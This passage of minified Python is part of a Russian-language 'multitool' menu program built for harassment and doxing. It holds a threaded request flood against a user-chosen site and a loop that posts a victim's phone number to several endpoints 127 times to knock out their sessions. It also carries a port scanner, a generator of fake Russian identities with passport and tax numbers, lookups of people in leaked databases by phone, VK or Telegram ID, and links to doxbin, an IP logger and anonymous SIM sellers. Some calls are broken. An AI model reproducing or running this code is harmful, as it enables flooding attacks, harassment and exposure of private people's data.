Gecko/8611 Firefox/86.0','Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/7211 Firefox/72.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/8314 Firefox/83.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.83; rv:12.0) Gecko/201209 Firefox/12.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.81; rv:15.0) Gecko/201512 Firefox/15.0','Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/7010 Firefox/70.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.70; rv:13.0) Gecko/201307 Firefox/13.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.69; rv:18.0) Gecko/201801 Firefox/18.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/6318 Firefox/63.0',x,x,'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/8713 Firefox/87.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.66; rv:16.0) Gecko/201602 Firefox/16.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/7119 Firefox/71.0','Mozilla/5.0 (X11; Linux x86_64; rv:71.0) Gecko/7121 Firefox/71.0',y,y]
		def AD(i):
			A=random.choice(AC);B={'User-Agent':A}
			try:C=requests.get(AA,headers=B);print(f"      [32mRequests send site {i} successfully ![0m\n")
			except:print(f"      [32mRequests send site {i} successfully ![0m\n")
		l=[]
		for AE in range(1,AB+1):R=threading.Thread(target=AD,args=[AE]);R.start();l.append(R)
		for R in l:R.join()
		logo();main()
	elif C=='08':
		AF=pystyle.Write.Input('      Введите ссылку: ',pystyle.Colors.green,interval=.005);AG=2;m=set()
		def n(url,depth=0):
			D=depth;B=url
			if D>AG:return
			C=urllib.parse.urlparse(B);E=f"{C.scheme}://{C.netloc}"
			if B in m:return
			try:F=requests.get(B);G=F.text;H=bs4.BeautifulSoup(G,'html.parser')
			except:return
			m.add(B);pystyle.Write.Print('      send: '+B+g,pystyle.Colors.green,interval=.005)
			for I in H.find_all('a'):
				A=I.get('href')
				if not A:continue
				A=A.split('#')[0].rstrip('/')
				if A.startswith('http'):
					J=urllib.parse.urlparse(A)
					if J.netloc!=C.netloc:continue
				else:A=E+A
				n(A,D+1)
		print();n(AF);logo();main()
	elif C=='09':print('');pystyle.Write.Print('      Итак приступим, прокси это тожк самое как VPN, но с другими понятиями и функциями. Для полной аноноимности в интернете, вам нужно будет купить прокси на сайте https://shopproxy.net. Ведь именно там не сливаются логи и многое другое. Подходит для Telegram и прочего использования ! Но если вы не можете позволить себе данную услугу, то воспользуйтесь бесплатным сервисом https://t.me/ProxyMTProto. На этом все.',pystyle.Colors.green,interval=.005);logo();main()
	elif C=='10':
		D=faker.Faker(locale='ru_RU');S=pystyle.Write.Input('\n      Введите пол (М/Ж): ',pystyle.Colors.green,interval=.005);print()
		if S not in[Y,Z]:S=random.select([Y,Z]);pystyle.Write.Print(f"      Вы ввели не корректный пол человека !\n\n",pystyle.Colors.red,interval=.005)
		if S==Y:o=D.first_name_male();p=D.middle_name_male()
		else:o=D.first_name_female();p=D.middle_name_female()
		AH=D.last_name();AI=f"{AH} {o} {p}";AJ=D.date_of_birth();AK=D.random_int(min=18,max=80);AL=D.street_address();AM=D.city();AN=D.region();AO=D.postcode();AP=f"{AL}, {AM}, {AN} {AO}";AQ=D.email();Q=D.phone_number();AR=str(D.random_number(digits=12,fix_len=_C));AS=str(D.random_number(digits=11,fix_len=_C));AT=str(D.random_number(digits=10,fix_len=_C));AU=D.random_int(min=1000,max=9999);Write.Print(f"      ФИО: {AI}\n",Colors.red_to_purple);Write.Print(f"      Пол: {S}\n",Colors.red_to_purple);Write.Print(f"      Дата рождения: {AJ.strftime('%d %B %Y')}\n",Colors.red_to_purple);Write.Print(f"      Возраст: {AK} лет\n",Colors.red_to_purple);Write.Print(f"      Адрес: {AP}\n",Colors.red_to_purple);Write.Print(f"      ИНН: {AR}\n",Colors.red_to_purple);Write.Print(f"      СНИЛС: {AS}\n",Colors.red_to_purple);Write.Print(f"      Паспорт серия: {AU} номер: {AT}\n",Colors.red_to_purple);logo();main()
	elif C=='11':
		print('')
		def AV(mac_address):
			B=f"https://api.macvendors.com/{mac_address}"
			try:
				A=requests.get(B)
				if A.status_code==200:return A.text.strip()
				else:return f"Error: {A.status_code} - {A.text}"
			except Exception as C:return f"Error: {str(C)}"
		AW=pystyle.Write.Input('      Введите Mac Addres: ',pystyle.Colors.green,interval=.005);AX=AV(AW);pystyle.Write.Print(f"      Vendor: {AX}",pystyle.Colors.green,interval=.005);logo();main()
	elif C=='12':
		pystyle.Write.Print('\n      Выберите режим: ',pystyle.Colors.green,interval=.005);pystyle.Write.Print('\n\n      [01] Проверить часто используемые порты',pystyle.Colors.green,interval=.005);pystyle.Write.Print('\n\n      [02] Пробить указанный порт',pystyle.Colors.green,interval=.005);q=pystyle.Write.Input('\n\n      Выберите пункт: ',pystyle.Colors.green,interval=.005)
		if q=='01':
			print();AY=[20,26,28,29,55,53,80,110,443,8080,1111,1388,2222,1020,4040,6035]
			for M in AY:
				N=socket.socket(socket.AF_INET,socket.SOCK_STREAM);a=N.connect_ex((z,M))
				if a==0:pystyle.Write.Print(f"      Порт {M} открыт",pystyle.Colors.green,interval=.005)
				else:pystyle.Write.Print(f"      Порт {M} закрыт",pystyle.Colors.green,interval=.005)
				N.close();print()
		elif q=='02':
			M=pystyle.Write.Input('\n      Введите номер порта: ',pystyle.Colors.green,interval=.005);N=socket.socket(socket.AF_INET,socket.SOCK_STREAM);a=N.connect_ex((z,int(M)));print()
			if a==0:pystyle.Write.Print(f"      Порт {M} открыт",pystyle.Colors.green,interval=.005)
			else:pystyle.Write.Print(f"      Порт {M} закрыт",pystyle.Colors.green,interval=.005)
			N.close();print()
		else:pystyle.Write.Print('\n        Команда не найдена',pystyle.Colors.red,interval=.005);print()
		logo();main()
	elif C=='13':
		print('');A=int(input('      \x1b[95mВведите номер: '))
		try:
			for _ in range(127):AZ=UserAgent().random;B={'user-agent':AZ};requests.post(H,headers=B,data={_A:A});requests.post(I,headers=B,data={_A:A});requests.post(J,headers=B,data={_A:A});requests.post(K,headers=B,data={_A:A});requests.post(L,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(H,headers=B,data={_A:A});requests.post(I,headers=B,data={_A:A});requests.post(J,headers=B,data={_A:A});requests.post(K,headers=B,data={_A:A});requests.post(L,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(H,headers=B,data={_A:A});requests.post(I,headers=B,data={_A:A});requests.post(J,headers=B,data={_A:A});requests.post(K,headers=B,data={_A:A});requests.post(L,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(H,headers=B,data={_A:A});requests.post(I,headers=B,data={_A:A});requests.post(J,headers=B,data={_A:A});requests.post(K,headers=B,data={_A:A});requests.post(L,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(H,headers=B,data={_A:A});requests.post(I,headers=B,data={_A:A});requests.post(J,headers=B,data={_A:A});requests.post(K,headers=B,data={_A:A});requests.post(L,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(H,headers=B,data={_A:A});requests.post(I,headers=B,data={_A:A});requests.post(J,headers=B,data={_A:A});requests.post(K,headers=B,data={_A:A});requests.post(L,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(H,headers=B,data={_A:A});requests.post(I,headers=B,data={_A:A});requests.post(J,headers=B,data={_A:A});requests.post(K,headers=B,data={_A:A});requests.post(L,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(H,headers=B,data={_A:A});requests.post(I,headers=B,data={_A:A});requests.post(J,headers=B,data={_A:A});requests.post(K,headers=B,data={_A:A});requests.post(L,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});requests.post(E,headers=B,data={_A:A});print('');print(f"      [95m✅ Запрос на снос сесий по номеру {A} успешно отправлен !")
		except Exception as Aa:print(Aa)
		logo();main()
	elif C=='14':
		b=pystyle.Write.Input('\n      Укажите путь к БД: ',pystyle.Colors.green,interval=.005);c=pystyle.Write.Input('\n      Введите текст:  ',pystyle.Colors.green,interval=.005);print()
		try:
			with open(b,'r',encoding=_D)as O:
				for G in O:
					if c in G:pystyle.Write.Print(A0+G.strip(),pystyle.Colors.green,interval=.005);print();break
				else:pystyle.Write.Print(h,pystyle.Colors.red,interval=.005)
		except:
			try:
				with open(b,'r',encoding='cp1251')as O:
					for G in O:
						if c in G:pystyle.Write.Print(A0+G.strip(),pystyle.Colors.green,interval=.005);print();break
					else:pystyle.Write.Print(h,pystyle.Colors.red,interval=.005)
			except:
				try:
					with open(b,'r',encoding='cp1252')as O:
						for G in O:
							if c in G:pystyle.Write.Print('[+] Результат: '+G.strip(),pystyle.Colors.green,interval=.005);print();break
						else:pystyle.Write.Print(h,pystyle.Colors.red,interval=.005)
				except:pystyle.Write.Print(f"      Произошла ошибка, проверьте ввод данных или путь !\n",pystyle.Colors.red,interval=.005)
		logo();main()
	elif C=='15':print('');pystyle.Write.Print(f"      Чтобы быть анонимным в интернете, нужен хороший VPN, который не сливает логи, не дает данные в федеральные организации и прочее. Самые анонимные VPN: Mullvad VPN, Outline VPN, Nord VPN, VPN Monster, Express VPN. Эти VPN подходят для очень высокой анонимности и для лжемина.\n",pystyle.Colors.red,interval=.005);logo();main()
	elif C=='16':print('');pystyle.Write.Print(f"      Читай пункт 09 !",pystyle.Colors.green,interval=.005);logo();main()
	elif C=='17':
		print('')
		def Ab(complexity):
			B=complexity;A=string.ascii_letters+string.digits
			if B=='medium':A+='!@#$%^&*()'
			elif B=='high':A+=string.punctuation
			return A
		def Ac(length,complexity):A=Ab(complexity);B=''.join(random.choice(A)for B in range(length));return B
		Ad=int(pystyle.Write.Input('      Введите длину пароля: ',pystyle.Colors.green,interval=.005));Ae=pystyle.Write.Input('      Выберите сложность (low/medium/high): ',pystyle.Colors.green,interval=.005);print();Af=Ac(Ad,Ae);pystyle.Write.Print('      Ваш пароль: '+Af+g,pystyle.Colors.green,interval=.005);logo();main()
	elif C=='18':print('');print('      [+] Лучший сервис по созданию анонимной почты - TempMail !');logo();main()
	elif C=='19':print('');pystyle.Write.Print('      Лучший сервис по вируальным номерам, это Sms Activate ! - Там выкупите номер быстро и анонимно.\n',pystyle.Colors.green,interval=.005);logo();main()
	elif C=='20':print('');pystyle.Write.Print('      Лучший сервис по продаже физ номеров, это https://t.me/Simki_genaBot. Тут вы купите физ анонимно, бистро и качественно !\n',pystyle.Colors.green,interval=.005);logo();main()
	elif C=='21':print('');pystyle.Write.Print('      Бро, просто составь текст, как считаешь нужным. В помощь 22 пункт.\n',pystyle.Colors.green,interval=.005);logo();main()
	elif C=='22':
		def Ag(input_text):
			C={'а':'@','б':'Б','в':'B','г':'г','д':'д','е':'е','ё':'ё','ж':'ж','з':'3','и':'u','й':'й','к':'K','л':'л','м':'M','н':'H','о':'0','п':'п','р':'P','с':'$','т':'T','у':'y','ф':'ф','х':'X','ц':'ц','ч':'4','ш':'ш','щ':'щ','ъ':'ъ','ы':'ы','ь':'ь','э':'э','ю':'ю','я':'я','А':'A','Б':'6','В':'V','Г':'r','Д':'D','Е':'E','Ё':'Ё',Z:Z,'З':'2','И':'I','Й':'Й','К':'K','Л':'Л',Y:'M','Н':'H','О':'O','П':'П','Р':'P','С':'$','Т':'T','У':'Y','Ф':'Ф','Х':'X','Ц':'Ц','Ч':'Ч','Ш':'Ш','Щ':'Щ','Ъ':'Ъ','Ы':'bl','Ь':'b','Э':'Э','Ю':'9Y','Я':'9A'};A=[]
			for B in input_text:
				if B in C:A.append(C[B])
				else:A.append(B)
			return''.join(A)
		Ah=pystyle.Write.Input('\n      Введите текст: ',pystyle.Colors.green,interval=.005);Ai=Ag(Ah);print();pystyle.Write.Print('      Ваш текст: '+Ai+g,pystyle.Colors.green,interval=.005);logo();main()
	elif C=='23':print('');pystyle.Write.Print('      Все темки - https://t.me/temkyx',pystyle.Colors.green,interval=.005);logo();main()
	elif C=='24':print('');pystyle.Write.Print('      Все абузы - https://t.me/temkyx',pystyle.Colors.green,interval=.005);logo();main()
	elif C=='25':print('');pystyle.Write.Print('      IP Logger - https://iplogger.org/ru/',pystyle.Colors.green,interval=.005);logo();main()
	elif C=='26':print('');pystyle.Write.Print('      Главный разработчик - Евгений Крестоносец\n',pystyle.Colors.yellow,interval=.005);pystyle.Write.Print('      Главный менеджер -\n\n',pystyle.Colors.green,interval=.005);pystyle.Write.Print('      Версия: 2.00\n\n',pystyle.Colors.blue,interval=.005);pystyle.Write.Print('      Канал проекта - https://t.me/HannixSoft',pystyle.Colors.white,interval=.005);logo();main()
	elif C=='27':print('');print(A1);logo();main()
	elif C=='28':print('');Aj=''.join(random.choice(string.ascii_uppercase+string.digits)for A in range(16));Write.Print(f"      [+] Ваш ключ: {Aj}",Colors.red_to_purple);logo();main()
	elif C=='29':print('');print(A1);logo();main()
	elif C=='30':
		print('');r=input(Fore.GREEN+f"      [+] Введите данные по которым нужно пробить: ")
		if not r:Write.Print('      [!] Запрос не может быть пустым !',Colors.red_to_purple,interval=.001);print('');return
		Write.Print('      [-] Поиск данных....',Colors.red_to_purple,interval=.001);print('');d=fetch_data(r)
		if d and _E in d:display_results(d)
		else:Write.Print('      [!] Результаты не найдены или произошла ошибка !',Colors.red_to_purple,interval=.001)
		logo();main()
	elif C=='31':print('');Ak=input(Fore.BLUE+'      Введите VK ID -> ');search_data(Ak,glob.glob('DNS*.csv'),threshold=99);input(Fore.GREEN+i);logo();main()
	elif C=='32':print('');P=input(Fore.BLUE+f"      [+] Введите данные для поиска -> ");Al=[f"https://t.me/{P}",f"https://vk.com/{P}",f"https://ok.ru/profile/{P}",f"https://doxbin.org/upload/{P}",f"https://yandex.ru/search/?text={P}"];print(f"      [+] Проверяй эти ссылки -> \n{Al}");input('      Enter для возврата в меню');logo();main()
	elif C=='33':print('');print('      Данная функция еще в разработке !');logo();main()
	elif C=='34':
		print('');Am='https://mtpro.xyz/api/?type=mtproto';e=get_mtproto_proxies(Am)
		if e:
			Write.Print(f"      [+] Найдено {len(e)} MTProto прокси:\n",Colors.red_to_purple)
			for An in e:display_mtproto_proxy(An)
		else:Write.Print('      [-] Не удалось получить MTProto прокси !',Colors.red_to_purple)
		logo();main()
	elif C=='35':print('');Ao=D.uuid4();Write.Print(f"      [+] Ваш UUID: {Ao}",Colors.red_to_purple);logo();main()
	elif C=='36':print('');Ap={'company':D.company(),'symbol':''.join(random.choices(string.ascii_uppercase,k=4)),'price':round(random.uniform(10,1000),2),'volume':random.randint(1000,1000000)};Write.Print(f"      [+] Сгенерированный профиль акции: {Ap}",Colors.red_to_purple);logo();main()
	elif C=='37':print('');s=faker.mac_address();Write.Print(f"      [+] Ваш MAC адрес: {s}",Colors.red_to_purple);logo();main()
	elif C=='38':print();AQ=D.email();Write.Print(f"      [+] Ваш Email адрес: {s}",Colors.red_to_purple);logo();main()
	elif C=='39':print()
	elif C=='40':print('');Aq=input(Fore.BLUE+'      Введите Telegran ID -> ');search_data(Aq,glob.glob('Telegram.csv'),encoding='latin-1',threshold=99);input(Fore.GREEN+i);logo();main()
	elif C=='41':print('');Ar=input(Fore.BLUE+'      Введите номер -> ');search_data(Ar,glob.glob('DATABASE*.csv'),threshold=99);input(Fore.GREEN+i);logo();main()
if __name__=='__main__':main()
